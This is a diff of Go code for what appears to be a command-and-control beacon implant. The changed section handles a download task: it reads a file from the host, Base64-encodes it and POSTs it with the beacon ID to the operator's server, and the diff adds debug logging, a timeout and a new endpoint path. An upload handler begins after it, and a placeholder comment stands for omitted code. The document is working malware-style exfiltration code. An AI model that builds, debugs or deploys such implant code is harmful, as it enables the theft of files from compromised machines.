@@ -940,43 +940,71 @@ func processTasks(tasks []Task) {
 			// Encode the file data as Base64
 			encodedData := base64.StdEncoding.EncodeToString(fileData)
 
+			// Detailed logging for debugging
+			writeErrorToFile(fmt.Sprintf("File read success - Size: %d bytes, Filename: %s", len(fileData), filename))
+			writeErrorToFile(fmt.Sprintf("Encoded data size: %d bytes", len(encodedData)))
+
 			// Create file response
 			fileDataObj := map[string]interface{}{
 				"FileData": encodedData,
-				"filename": filename,
+				"FileName": filename,
 			}
 
-			// Create response
+			// Log the fileDataObj keys for debugging
+			writeErrorToFile("FileDataObj keys:")
+			for key := range fileDataObj {
+				writeErrorToFile(fmt.Sprintf("  - %s", key))
+			}
+
+			// Create response with proper Rust enum format
 			response := CommandResponse{
 				ID:       task.ID,
 				BeaconID: beaconID,
-				Result:   fileDataObj,
+				Result:   map[string]interface{}{
+					"FileData": fileDataObj,
+				},
 			}
 
 			// Send the file data to the server
-			client := &http.Client{}
+			client := &http.Client{
+				Timeout: 30 * time.Second, // Add timeout for better error detection
+			}
 			responseJSON, err := json.Marshal(response)
 			if err != nil {
 				logError("Failed to marshal file response: %v", err)
+				writeErrorToFile(fmt.Sprintf("JSON marshal error: %v", err))
 				continue
 			}
+			writeErrorToFile(fmt.Sprintf("Response JSON size: %d bytes", len(responseJSON)))
 
+			// Enhanced HTTP request logging
+			writeErrorToFile(fmt.Sprintf("Sending download response to %s/responses", serverURL))
 			resp, err := client.Post(
-				fmt.Sprintf("%s/api/responses", serverURL),
+				fmt.Sprintf("%s/responses", serverURL),
 				"application/json",
 				bytes.NewBuffer(responseJSON),
 			)
-
 			if err != nil {
-				logError("Failed to send file data: %v", err)
+				logError("Failed to send file to server: %v", err)
+				writeErrorToFile(fmt.Sprintf("HTTP error sending file: %v", err))
 				continue
 			}
 			defer resp.Body.Close()
+			
+			// Log HTTP response details
+			writeErrorToFile(fmt.Sprintf("HTTP response status: %s", resp.Status))
+			respBody, _ := io.ReadAll(resp.Body)
+			if len(respBody) > 0 {
+				writeErrorToFile(fmt.Sprintf("Response body: %s", string(respBody)))
+			} else {
+				writeErrorToFile("Response body empty")
+			}
 
 			logSuccess("Successfully sent file data for %s (%d bytes)", filename, len(fileData))
 			continue
 		}
 
+// ... (rest of the code remains the same)
 		// HANDLE UPLOAD COMMAND
 		if uploadData, ok := cmdData["Upload"].(map[string]interface{}); ok {
 			logDebug("Processing upload command: %v", uploadData)
